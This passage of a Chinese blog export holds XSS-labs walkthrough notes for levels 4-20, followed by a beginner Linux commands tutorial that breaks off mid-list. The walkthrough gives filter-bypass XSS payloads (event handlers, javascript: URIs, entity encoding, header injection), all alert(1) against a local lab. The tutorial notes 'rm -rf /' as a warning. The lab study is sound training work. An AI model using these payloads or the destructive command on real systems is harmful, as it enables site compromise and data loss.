onfocus事件绕过闭合）"></a>less-4（onclick onfocus事件绕过闭合）</h2><p>发现单引号不能闭合input标签的value属性对应值的引号，所以再加一个双引号来闭合</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-string">&#x27;&quot; onclick=&#x27;</span>alert(<span class="hljs-number">1</span>)&#x27;<br><span class="hljs-string">&#x27;&quot; onblur=&#x27;</span>alert(<span class="hljs-number">1</span>)&#x27;<br><br>或者这种写法<br><span class="hljs-string">&#x27;&quot; onblur=&#x27;</span>javascript:alert(<span class="hljs-number">1</span>)&#x27;<br></code></pre></td></tr></table></figure><h2 id="less-5（a-href-标签javascript伪协议绕过）"><a href="#less-5（a-href-标签javascript伪协议绕过）" class="headerlink" title="less-5（a href 标签javascript伪协议绕过）"></a>less-5（a href 标签javascript伪协议绕过）</h2><p>这一关将script和onblur等都进行了替换，中间加了个_导致失效，且由于有strtolowers（），所有的大写字母都会被转成小写无法使用大小写绕过，那么我们可以考虑直接去闭合整个input标签，自己再添加上a标签，a标签中使用javascript伪协议指定js代码执行</p><p>构造payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&#x27;&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&#x27;javascript:alert(1)&#x27;</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="less-6（大小写绕过）"><a href="#less-6（大小写绕过）" class="headerlink" title="less-6（大小写绕过）"></a>less-6（大小写绕过）</h2><p>尝试上一关的payload，发现href被处理了，中间加了_，使用大小写混合绕过</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml">&#x27;&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">HREF</span>=<span class="hljs-string">&#x27;javascript:alert(1)&#x27;</span>&gt;</span><br><br>或者<br>&#x27;&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">HREF</span>=<span class="hljs-string">&#x27;javascript:alert(1)&#x27;</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="less-7（双写绕过）"><a href="#less-7（双写绕过）" class="headerlink" title="less-7（双写绕过）"></a>less-7（双写绕过）</h2><p>尝试上一关的payload发现script、href等被替换为空了，使用双写绕过</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&#x27;&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">HRhrefEF</span>=<span class="hljs-string">&#x27;javascscriptript:alert(1)&#x27;</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="less-8（unicode编码绕过）"><a href="#less-8（unicode编码绕过）" class="headerlink" title="less-8（unicode编码绕过）"></a>less-8（unicode编码绕过）</h2><p>编码网站<br><a href="http://tools.gree020.cn/unicode/">http://tools.gree020.cn/unicode/</a></p><p><a href="https://tool.chinaz.com/tools/unicode.aspx">https://tool.chinaz.com/tools/unicode.aspx</a></p><p>尝试第5关的payload发现很多关键词都被加了_，比如href、script，尝试大小写绕过也不行，但是这里发现我们输入的payload被放在了其中的一个a标签的href属性中，直接尝试javascript伪协议，发现被转化成饿了html实体编码，这里使用unicode编码绕过，将<code>javascript:alert(1)</code>unicode转ascii（十进制ascii码）转成十六进制unicode编码也行</p><p>注意：只有作为属性值的时候才能进行编码</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-symbol">&amp;#106;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#118;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#115;</span><span class="hljs-symbol">&amp;#99;</span><span class="hljs-symbol">&amp;#114;</span><span class="hljs-symbol">&amp;#105;</span><span class="hljs-symbol">&amp;#112;</span><span class="hljs-symbol">&amp;#116;</span><span class="hljs-symbol">&amp;#58;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#108;</span><span class="hljs-symbol">&amp;#101;</span><span class="hljs-symbol">&amp;#114;</span><span class="hljs-symbol">&amp;#116;</span><span class="hljs-symbol">&amp;#40;</span><span class="hljs-symbol">&amp;#49;</span><span class="hljs-symbol">&amp;#41;</span><br></code></pre></td></tr></table></figure><h2 id="less-9（注释http-绕过）"><a href="#less-9（注释http-绕过）" class="headerlink" title="less-9（注释http:&#x2F;&#x2F;绕过）"></a>less-9（注释http:&#x2F;&#x2F;绕过）</h2><p>查看源码发现使用了strpos函数去查找我们的payload中含不含http:&#x2F;&#x2F;，如果不含的话不会输出我们的payload，所以我们在之前的语句后加一个**&#x2F;&#x2F;http:&#x2F;&#x2F;**注释掉http:&#x2F;&#x2F;，并且这里需要将原payload：<code>javascript:alert(1)</code>进行unicode编码，不然会被加_</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">&amp;#<span class="hljs-number">106</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">118</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">115</span>;&amp;#<span class="hljs-number">99</span>;&amp;#<span class="hljs-number">114</span>;&amp;#<span class="hljs-number">105</span>;&amp;#<span class="hljs-number">112</span>;&amp;#<span class="hljs-number">116</span>;&amp;#<span class="hljs-number">58</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">108</span>;&amp;#<span class="hljs-number">101</span>;&amp;#<span class="hljs-number">114</span>;&amp;#<span class="hljs-number">116</span>;&amp;#<span class="hljs-number">40</span>;&amp;#<span class="hljs-number">49</span>;&amp;#<span class="hljs-number">41</span>;<span class="hljs-comment">//http://</span><br></code></pre></td></tr></table></figure><h2 id="less-10（隐藏的传参）"><a href="#less-10（隐藏的传参）" class="headerlink" title="less-10（隐藏的传参）"></a>less-10（隐藏的传参）</h2><p>发现上面的测试手段不太行了，但是查看页面源码发现了三个隐藏的input name分别为（t_link t_history t_sort），那么根据他们的name构造传参，谁出来了谁就能利用<code>http://192.168.32.1/xss-labs/level10.php?keyword=well%20done!&amp;t_link=aa&amp;t_history=bb&amp;t_sort=cc</code>可以看到cc输出到了某个input标签的value属性对应的值的位置，那么我们构造如下payload，让他们的type从hidden变为text，不再隐藏，并执行js代码</p><p><strong>注意：这里的type属性谁在前面，浏览器就会用谁</strong></p><figure class="highlight scilab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs scilab"><span class="hljs-string">&#x27;&quot;</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;text&#x27;</span> onclick=<span class="hljs-string">&#x27;alert(1)&#x27;</span><br><br>或者<br><span class="hljs-string">&#x27;&quot;</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;text&#x27;</span> onclick=<span class="hljs-string">&#x27;javascript:alert(1)&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="less-11（Referer注入）"><a href="#less-11（Referer注入）" class="headerlink" title="less-11（Referer注入）"></a>less-11（Referer注入）</h2><p>这一关和第十关有点像，也是发现几个隐藏的输入框，而且t_sort也能输出到了某个input标签的value属性对应的值的位置但是这里无法闭合，推测是被htmlspecialchars了，但是发现t_ref那个输入框的value值为referer请求头的值（且查看源码发现没有过滤），那么这里可以尝试给referer值加上xss的payload来进行测试</p><p>通过buro抓包来修改，payload用的还是第十关的payload。当第十关完成的时候，点击确定，然后抓包，可以抓到第十一关的数据包，然后将referer改为上面的payload</p><figure class="highlight scilab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scilab"><span class="hljs-string">&#x27;&quot;</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;text&#x27;</span> onclick=<span class="hljs-string">&#x27;alert(1)&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="less-12（User-Agent注入）"><a href="#less-12（User-Agent注入）" class="headerlink" title="less-12（User Agent注入）"></a>less-12（User Agent注入）</h2><p>检查发现有个input标签name为t_ua，值为user agent的值，和上一题差不多抓包构造User Agent的payload</p><figure class="highlight scilab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scilab"><span class="hljs-string">&#x27;&quot;</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;text&#x27;</span> onclick=<span class="hljs-string">&#x27;alert(1)&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="less-13（cookie注入）"><a href="#less-13（cookie注入）" class="headerlink" title="less-13（cookie注入）"></a>less-13（cookie注入）</h2><p>检查发现有个input标签name为t_cook，值为cookie的值，和前两题差不多抓包构造Cookie的payload</p><p>user&#x3D;<code>&#39;&quot; type=&#39;text&#39; onclick=&#39;alert(1)&#39;</code></p><figure class="highlight scilab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scilab"><span class="hljs-string">&#x27;&quot;</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;text&#x27;</span> onclick=<span class="hljs-string">&#x27;alert(1)&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="less-14（题有问题直接跳过）"><a href="#less-14（题有问题直接跳过）" class="headerlink" title="less-14（题有问题直接跳过）"></a>less-14（题有问题直接跳过）</h2><h2 id="less-15（ng-include文件包涵）"><a href="#less-15（ng-include文件包涵）" class="headerlink" title="less-15（ng-include文件包涵）"></a>less-15（ng-include文件包涵）</h2><p>先使用src传参试试，发现有输出，有个nginclude。</p><p><img src="/../image/xss-labs-1.png"></p><p>他是可以引入某个html页面那我们就把第一关的页面引入尝试一下</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?s</span>rc=<span class="hljs-string">&#x27;http://192.168.32.1/xss-labs/level1.php?name=test&#x27;</span><br></code></pre></td></tr></table></figure><p>这里成功引入我们第一关的html文件</p><p>使用第一关的漏洞<code>src=&#39;http://192.168.32.1/xss-labs/level1.php?name=test?name&lt;script&gt;alert(1);&lt;/script&gt;&#39;</code>让第一关弹窗，尝试后发现不行，应该是有过滤把<code>&lt;script&gt;</code>过滤掉了（注意，这里不能包涵那些直接弹窗的东西如<code>&lt;script&gt;</code>，但是可以包涵那些标签的东西比如<code>&lt;a&gt;、&lt;input&gt;、&lt;img&gt;、&lt;p&gt;</code>标签等等，这些标签是能需要我们手动点击弹窗的），这里我们使用img标签</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=1 οnerrο<span class="hljs-attribute">r</span>=alert(1)&gt;&#x27;<br><br>也可以用a标签<br>&lt;a <span class="hljs-attribute">href</span>=javascript:alert(1)&gt;&#x27;<br></code></pre></td></tr></table></figure><h2 id="less-16（url编码）"><a href="#less-16（url编码）" class="headerlink" title="less-16（url编码）"></a>less-16（url编码）</h2><p>使用上一关的img标签payload发现有输出但是进行了html实体编码，空格被变成了html实体编码<code>&amp;nbsp;</code>，我们将空格的编码替换成回车的编码进行尝试</p><p><a href="https://www.qianbo.com.cn/Tool/Url-Encode.html">UrlEncode - 在线URL网址编码、解码</a></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;img%<span class="hljs-number">0</span>Asrc<span class="hljs-operator">=</span><span class="hljs-number">1</span>%<span class="hljs-number">0</span>Aοnerrοr<span class="hljs-operator">=</span>alert(<span class="hljs-number">1</span>)&gt;<br></code></pre></td></tr></table></figure><h2 id="less-17（embed标签）"><a href="#less-17（embed标签）" class="headerlink" title="less-17（embed标签）"></a>less-17（embed标签）</h2><p>embed标签可以理解为定义了一个区域，可以放图片、视频、音频等内容，但是相对于他们，embed标签打开不了文件的时候就会有块错误的取余。也可以绑定各种事件，比如尝试绑定一个onmouseover事件（鼠标移动到上面就会触发的事件）。后台看代码用了htmlspecialchars，所以直接写标签是不行的。</p><p>我们传参的内容被输出到embed标签属性上了，直接闭合然后绑定事件即可</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-string">&#x27; onmouseover=&#x27;</span><span class="hljs-function"><span class="hljs-title">alert</span>(<span class="hljs-number">1</span>)<span class="hljs-string">&#x27;</span></span><br><span class="hljs-string"><span class="hljs-function"></span></span><br><span class="hljs-string"><span class="hljs-function">&#x27;</span> ο<span class="hljs-variable">nclick</span>=<span class="hljs-string">&#x27;alert()&#x27;</span></span><br></code></pre></td></tr></table></figure><h2 id="less-18（embed标签）"><a href="#less-18（embed标签）" class="headerlink" title="less-18（embed标签）"></a>less-18（embed标签）</h2><p>一样</p><h2 id="less-19-and-20（flash已经全面停止使用了，直接不做了）"><a href="#less-19-and-20（flash已经全面停止使用了，直接不做了）" class="headerlink" title="less-19 and 20（flash已经全面停止使用了，直接不做了）"></a>less-19 and 20（flash已经全面停止使用了，直接不做了）</h2><p>这两关涉及到flash触发的xss漏洞，现在flash技术全面停止使用了，所以不做了</p>]]></content>
      
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> xss漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux基础命令</title>
      <link href="/2025/02/01/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"/>
      <url>/2025/02/01/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux目录结构"><a href="#Linux目录结构" class="headerlink" title="Linux目录结构"></a>Linux目录结构</h1><p>Linux的目录结构是一个树型结构</p><p>windows系统可以拥有多个盘符，如C盘，D盘，E盘</p><p>Linux没有盘符这个概念，只有一个根目录&#x2F;，所有文件都在它下面</p><p><img src="/../image/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-1.png"></p><h3 id="Linux路径的描述方式"><a href="#Linux路径的描述方式" class="headerlink" title="Linux路径的描述方式"></a>Linux路径的描述方式</h3><p>在Linux中，路径之间的层级关系，使用：&#x2F;来表示</p><p>在windows系统中，路径之间的层级关系，使用：\来表示</p><p><img src="/../image/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-2.png"></p><h2 id="FinalShell"><a href="#FinalShell" class="headerlink" title="FinalShell"></a>FinalShell</h2><p>连接前先输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> service ssh start<br></code></pre></td></tr></table></figure><h1 id="Linux命令入门"><a href="#Linux命令入门" class="headerlink" title="Linux命令入门"></a>Linux命令入门</h1><h2 id="Linux命令基础"><a href="#Linux命令基础" class="headerlink" title="Linux命令基础"></a>Linux命令基础</h2><p><strong>什么是命令、命令行</strong></p><p><img src="/../image/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3.png"></p><p><strong>Linux命令基础格式</strong></p><p>无论是什么命令，用于什么用途，在Linux中，命令有其通用的格式：<br>command [-options] [parameter]</p><ul><li>commad：命令本身</li><li>-options：[可选，非必填]命令的一些选项，可以通过选项控制命令的行为细节</li><li>parameter：[可选，非必填]命令的参数，多数用于命令的指向目标等</li></ul><p>语法中的[]，表示可选的意思</p><p>示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -l /home/itheima, <span class="hljs-built_in">ls</span>是命令本身，-l是选项,/home/itheima是参数<br>意思是以列表形式，显示/home/itheima目录内的内容<br><br><span class="hljs-built_in">cp</span> -r test1 test2, <span class="hljs-built_in">cp</span>是命令本身，-r是选项，test1和test2是参数<br>意思是复制文件夹test1 成为 test2<br></code></pre></td></tr></table></figure><h3 id="ls命令入门（列出目录下内容）"><a href="#ls命令入门（列出目录下内容）" class="headerlink" title="ls命令入门（列出目录下内容）"></a>ls命令入门（列出目录下内容）</h3><p><strong>ls命令</strong></p><p><strong>ls命令的作用是列出目录下的内容，语法细节如下：</strong></p><p><strong><code>ls [-a -l -h] [Linux路径]</code></strong></p><p>-a -l -h是可选的选项</p><p>Linux路径是此命令可选的参数</p><p>当不适用选项和参数，直接使用ls命令本体，表示：以平铺形式，列出当前工作目录下的内容。</p><p><strong>HOME目录和工作目录</strong></p><p><img src="/../image/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-4.png"></p><h3 id="ls命令的参数和选项"><a href="#ls命令的参数和选项" class="headerlink" title="ls命令的参数和选项"></a>ls命令的参数和选项</h3><p><strong>ls命令的参数</strong></p><p>当ls不适用参数，表示列出：当前工作目录的内容，即用户的HOME目录</p><p>当使用参数，ls命令的参数表示：指定一个Linux路径，列出指定路径的内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> / 列出根目录的内容<br></code></pre></td></tr></table></figure><p><strong>ls命令的选项</strong></p><ul><li>-a选项，表示：all的意思，即列出全部文件（包含隐藏的文件&#x2F;文件夹）</li><li>-l选项，表示：以列表（竖向排列）的形式展示内容，并展示更多信息</li><li>-h选项，表示：以易于阅读的形式，列出文件大小，如K、M、G，必需搭配-l一起使用</li></ul><p><strong>ls命令选项的组合使用</strong><br>语法中的选项是可以组合使用的，比如学习的-a和-l可以组合应用</p><p>写法：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">ls</span> -<span class="hljs-keyword">l</span> -<span class="hljs-keyword">a</span><br><span class="hljs-keyword">ls</span> -<span class="hljs-keyword">la</span><br><span class="hljs-keyword">ls</span> -<span class="hljs-keyword">al</span><br></code></pre></td></tr></table></figure><p>三种写法都一样，表示同时应用-l和-a的功能</p><p><strong>ls选项和参数的组合使用</strong></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">ls</span> -<span class="hljs-keyword">la</span> /<br><span class="hljs-keyword">ls</span> -<span class="hljs-keyword">lh</span><br><span class="hljs-keyword">ls</span> -lah<br><span class="hljs-keyword">ls</span> -<span class="hljs-keyword">l</span> -<span class="hljs-keyword">a</span> -h<br></code></pre></td></tr></table></figure><h2 id="目录切换相关命令（cd-pwd）"><a href="#目录切换相关命令（cd-pwd）" class="headerlink" title="目录切换相关命令（cd&#x2F;pwd）"></a>目录切换相关命令（cd&#x2F;pwd）</h2><h4 id="cd（切换工作目录）"><a href="#cd（切换工作目录）" class="headerlink" title="cd（切换工作目录）"></a>cd（切换工作目录）</h4><p>当Linux终端（命令行）打开的时候，会默认以用户的HOME目录作为当前的工作目录</p><p>我们可以通过cd命令，更改当前所在的工作目录。</p><p>cd命令来自英文：Change Directory</p><p><strong>语法：<code>cd [Linux路径]</code></strong></p><ul><li>cd命令无需选项，只有参数，表示要切换到哪个目录下</li><li>cd命令直接执行，不写参数，表示回到用户的HOME目录</li></ul><h4 id="pwd（查看当前工作目录）"><a href="#pwd（查看当前工作目录）" class="headerlink" title="pwd（查看当前工作目录）"></a>pwd（查看当前工作目录）</h4><p>通过ls来验证当前的工作目录，其实是不恰当的。</p><p>我们可以通过pwd命令，来查看当前所在的工作目录。</p><p>pwd命令来自：Print Work Directory</p><p><strong>语法：<code>pwd</code></strong></p><ul><li><strong>pwd命令，无选项，无参数，直接输入pwd即可</strong></li></ul><h2 id="相对路径和绝对路径"><a href="#相对路径和绝对路径" class="headerlink" title="相对路径和绝对路径"></a>相对路径和绝对路径</h2><p>绝对路径：以根目录做起点，描述路径的方式，路径以&#x2F;开头</p><p>相对路径：以当前目录做起点，描述路径的方式，路径不需以&#x2F;开头</p><h2 id="特殊路径符"><a href="#特殊路径符" class="headerlink" title="特殊路径符"></a>特殊路径符</h2><ul><li>.表示当前目录，比如cd .&#x2F;Desktop 表示切换到当前目录下的Desktop目录内，和cd Desktop效果一致</li><li>..       表示上一级目录，比如：cd .. 即可切换到上一级目录，cd ..&#x2F;.. 切换到上二级目录</li><li>~       表示HOME目录，比如：cd ~ 即可切换到HOME目录或cd ~ &#x2F;Desktop，切换到HOME内的Desktop目录</li></ul><h2 id="创建目录命令（mkdir）"><a href="#创建目录命令（mkdir）" class="headerlink" title="创建目录命令（mkdir）"></a>创建目录命令（mkdir）</h2><p>通过mkdir命令可以创建新的目录（文件夹）</p><p>mkdir：Make Directory</p><p><strong>语法：mkdir [-p] Linux路径</strong></p><ul><li>参数必填，表示Linux路径，即要创建的文件夹的路径，相对路径或绝对路径均可</li><li>-p选项可选，表示自动创建不存在的父目录，适用于创建连续多层级的目录</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> itheima<br><span class="hljs-built_in">mkdir</span> /home/itheima/test<br><span class="hljs-built_in">mkdir</span> ./test2<br><span class="hljs-built_in">mkdir</span> ../test3<br><span class="hljs-built_in">mkdir</span> ~/test3<br></code></pre></td></tr></table></figure><p><strong>mkdir -p 选项</strong></p><p>如果想要一次性创建多个层级的目录</p><p>可以通过-p选项，将一整个链条都创建完成</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> -p itcast/good/666<br></code></pre></td></tr></table></figure><h2 id="文件操作命令"><a href="#文件操作命令" class="headerlink" title="文件操作命令"></a>文件操作命令</h2><h3 id="touch（创建文件）"><a href="#touch（创建文件）" class="headerlink" title="touch（创建文件）"></a>touch（创建文件）</h3><p>可以通过touch命令创建文件</p><p><strong>语法：<code>**touch Linux路径</code></strong>**</p><ul><li>touch命令无选项，参数必填，表示要创建的文件路径，相对、绝对、特殊路径符均可以使用</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> test.txt<br></code></pre></td></tr></table></figure><h3 id="cat命令（查看文件内容）"><a href="#cat命令（查看文件内容）" class="headerlink" title="cat命令（查看文件内容）"></a>cat命令（查看文件内容）</h3><p>准备好文件内容后，可以通过cat查看内容。</p><p><strong>语法：<code>cat Linux路径</code></strong></p><ul><li>cat同样没有选项，只有必填参数，参数表示：被查看的文件路径，相对、绝对、特殊路径符都可以使用</li></ul><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">cat</span> <span class="hljs-keyword">test</span>.txt<br></code></pre></td></tr></table></figure><h3 id="more命令（查看文件内容）"><a href="#more命令（查看文件内容）" class="headerlink" title="more命令（查看文件内容）"></a>more命令（查看文件内容）</h3><p>more命令同样可以查看文件内容，同cat不同的是：</p><ul><li>cat是直接将内容全部显示出来</li><li>more支持翻页，如果文件内容过多，可以一页页的展示</li></ul><p><strong>语法：<code>more Linux路径</code></strong></p><ul><li>同样没有选项，只有必填参数，参数表示：被查看的文件路径，相对、绝对、特殊路径符都可以使用</li></ul><p><strong>在查看的过程中，通过空格翻页</strong></p><p><strong>通过q退出查看</strong></p><h3 id="cp命令（复制文件文件夹）"><a href="#cp命令（复制文件文件夹）" class="headerlink" title="cp命令（复制文件文件夹）"></a>cp命令（复制文件文件夹）</h3><p>cp命令可以用于复制文件\文件夹，cp命令：copy</p><p><strong>语法：<code>cp [-r] 参数1 参数2</code></strong></p><ul><li><strong>-r选项，可选，用于复制文件夹使用，表示递归</strong></li><li><strong>参数1，Linux路径，表示被复制的文件或文件夹</strong></li><li><strong>参数2，Linux路径，表示要复制去的地方</strong></li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">cp test<span class="hljs-selector-class">.txt</span> test2<span class="hljs-selector-class">.txt</span><br>cp test<span class="hljs-selector-class">.txt</span> ./test2<span class="hljs-selector-class">.txt</span><br>cp test<span class="hljs-selector-class">.txt</span> /home/itheima/test2<span class="hljs-selector-class">.txt</span><br><br>复制文件夹<br>cp -<span class="hljs-attribute">r</span> itheima itheima2<br></code></pre></td></tr></table></figure><h3 id="mv（移动文件或文件夹）"><a href="#mv（移动文件或文件夹）" class="headerlink" title="mv（移动文件或文件夹）"></a>mv（移动文件或文件夹）</h3><p><strong>mv命令可以用于移动文件\文件夹</strong></p><p><strong>mv命令：move</strong></p><p><strong>语法：<code>mv 参数1 参数2</code></strong></p><ul><li>参数1，Linux路径，表示被移动的文件或文件夹</li><li>参数2，Linux路径，表示要移动去的地方，如果目标不存在，则进行改名，确保目标存在</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">移动文件<br><span class="hljs-built_in">mv</span> test.txt Desktop/<br><br>改名<br><span class="hljs-built_in">mv</span> test2.txt test3.txt<br><br>文件夹的移动<br><span class="hljs-built_in">mv</span> <span class="hljs-built_in">test</span> Desktop/<br></code></pre></td></tr></table></figure><h3 id="rm（删除文件、文件夹）"><a href="#rm（删除文件、文件夹）" class="headerlink" title="rm（删除文件、文件夹）"></a>rm（删除文件、文件夹）</h3><p><strong>rm命令可用于删除文件、文件夹</strong></p><p>rm命令：remove</p><p><strong>语法：<code>rm [-r -f] 参数1 参数2 ...... 参数N</code></strong></p><ul><li><p>同cp命令一样，-r选项用于删除文件夹</p></li><li><p>-f表示force，强制删除（不会弹出提示确认信息）</p><ul><li><p>普通用户删除内容不会弹出提示，只有root管理员用户删除内容会有提示</p></li><li><p>所以一般普通用户用不到-f选项</p></li><li><p>演示强制删除，-f选项</p><p>可以通过su - root，并输入密码临时切换到root用户体验</p><p>通过输入exit命令，退回普通用户</p></li></ul></li><li><p>参数1、参数2、……、参数N表示要删除的文件或文件夹路径，安装空格隔开</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">删除文件<br><span class="hljs-built_in">rm</span> test3.txt<br><br>删除文件夹<br><span class="hljs-built_in">rm</span> -r test2<br><br>多个文件夹的删除<br><span class="hljs-built_in">rm</span> -r test2 test3 test4 itheima<br></code></pre></td></tr></table></figure><h4 id="rm删除文件、文件夹-通配符"><a href="#rm删除文件、文件夹-通配符" class="headerlink" title="rm删除文件、文件夹-通配符"></a>rm删除文件、文件夹-通配符</h4><p>rm命令支持通配符*，用来做模糊匹配</p><ul><li>符号*表示通配符，即匹配任意内容（包含空），示例：</li><li>test*,表示匹配任何以test开头的内容</li><li>*test，表示匹配任何以test结尾的内容</li><li>*test*，表示匹配任何包含test的内容</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">演示：<br>删除所有以<span class="hljs-built_in">test</span>开头的文件或文件夹<br><span class="hljs-built_in">rm</span> -r <span class="hljs-built_in">test</span>*<br></code></pre></td></tr></table></figure><p><strong>注意：</strong></p><p><strong>rm -rf &#x2F;</strong></p><p><strong>rm -rf &#x2F;</strong>*</p><p><strong>等同于格式化</strong></p><h2 id="查找命令"><a href="#查找命令" class="headerlink" title="查找命令"></a>查找命令</h2><h3 id="which（查找命令的程序文件）"><a href="#which（查找命令的程序文件）" class="headerlink" title="which（查找命令的程序文件）"></a>which（查找命令的程序文件）</h3><p><strong>语法：<code>which 要查找的命令</code></strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">which</span> <span class="hljs-built_in">cd</span><br><span class="hljs-built_in">which</span> <span class="hljs-built_in">pwd</span><br><span class="hljs-built_in">which</span> <span class="hljs-built_in">touch</span><br><span class="hljs-built_in">which</span> <span class="hljs-built_in">mkdir</span><br><span class="hljs-built_in">which</span> <span class="hljs-built_in">cp</span><br><span class="hljs-built_in">which</span> <span 